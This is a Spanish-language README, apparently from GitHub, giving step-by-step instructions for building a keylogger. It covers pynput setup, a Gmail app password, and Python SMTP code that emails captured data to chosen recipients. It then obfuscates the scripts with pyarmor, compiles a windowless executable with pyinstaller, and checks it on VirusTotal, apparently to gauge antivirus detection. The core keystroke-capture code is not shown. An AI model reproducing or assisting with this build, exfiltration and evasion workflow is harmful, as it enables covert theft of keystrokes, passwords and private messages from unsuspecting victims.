# **Keylogger: Guía de Configuración y Uso**

## **1. Requisitos Previos**

### **a. Configuración del Entorno**

1. **Instalar Python**:  
   Asegúrate de tener Python 3.x instalado en tu sistema.  
   Descárgalo desde [python.org](https://www.python.org/downloads/).
2. **Instalar las dependencias necesarias**:  
   Ejecuta el siguiente comando en tu terminal:
   ```bash
   pip install pynput
   ```
### **b. Crear una Clave de Aplicación en Gmail**
Accede a tu cuenta de Gmail.

Ve a la página de configuración de contraseñas de aplicación:

myaccount.google.com/apppasswords

Genera una clave de aplicación:

Selecciona "Correo" como aplicación.

Selecciona "Equipo personal" como dispositivo.

Copia la clave generada (por ejemplo: yxki jwbt ebfu khvc).

![Pasted image 20240628130101](https://github.com/user-attachments/assets/88b09cca-fac8-4f1a-893a-319198f6ae93)

⚠️ Importante: No compartas esta clave públicamente y guárdala de forma segura.

## **2. Crear el Script del Keylogger**
### **a. Archivos Requeridos**
Crea los siguientes archivos con el código proporcionado:

- Archivo: main.py
- Archivo: keylogger.py

### **b. Clave de aplicación**
La parte del script donde añadir los datos de envió del mail están en esta parte, y no te olvides de importar las librerías!!!
```python
import smtplib
from email.mime.text import MIMEText

subject = "Email Subject"
body = "This is the body of the text message"
sender = "sender@gmail.com"  #Sender Email Address
recipients = ["recipient1@gmail.com", "recipient2@gmail.com"]  # Multiple email address can be given
password = "password" # Gmail Application Password

# We will create a function to send mail .We will pass above values in funcion parameter.
def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)   # Creating msg object using MIMEText class of email module
    msg['Subject'] = subject  # Assigning the subject
    msg['From'] = sender  # Assigning the sender email address
    msg['To'] = ', '.join(recipients)  # Assigning recepients email address.
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:   # Creating connection using context manager
       smtp_server.login(sender, password)
       smtp_server.sendmail(sender, recipients, msg.as_string())
    print("Email sent Successfully!")


# We will call the function and pass the parameter values defined in line no 4 to 8.
send_email(subject, body, sender, recipients, password)
```
## **3. Ofuscar el Código**
Ejecuta los siguientes comandos para ofuscar los scripts:
```python
pyarmor gen keylogger.py
pyarmor gen main.py
```
![Pasted image 20241204191457](https://github.com/user-attachments/assets/efd58f8e-b7cc-419b-b7c8-a24d85e9aa7f)

## **4. Compilar**
Usa pyinstaller para generar un ejecutable:
```python
pyinstaller --onefile --noconsole --add-data "dist/keylogger.py;." --hidden-import=pynput.keyboard --hidden-import=smtplib --hidden-import=termcolor --hidden-import=socket --hidden-import=os --hidden-import=email.mime --hidden-import=email.mime.text dist/main.py
```
![Pasted image 20241204191801](https://github.com/user-attachments/assets/e6a870b2-bc81-4ba5-b413-39a2a56b7f9e)

## **4. Resultado Final**
1. **Ejecutables Generados**
Una vez compilado, tendrás un archivo ejecutable en la carpeta dist.
El resultado se verá del siguiente modo:
![Pasted image 20241204192049](https://github.com/user-attachments/assets/01054c9d-8156-4a8f-a3ce-c25776f76ae5)

2. **Análisis en Virus Total**
Puedes analizar el ejecutable en Virus Total para comprobar su estado.
![Pasted image 20241204192640](https://github.com/user-attachments/assets/16ce5656-e36b-4ed4-b355-19718fb753f6)




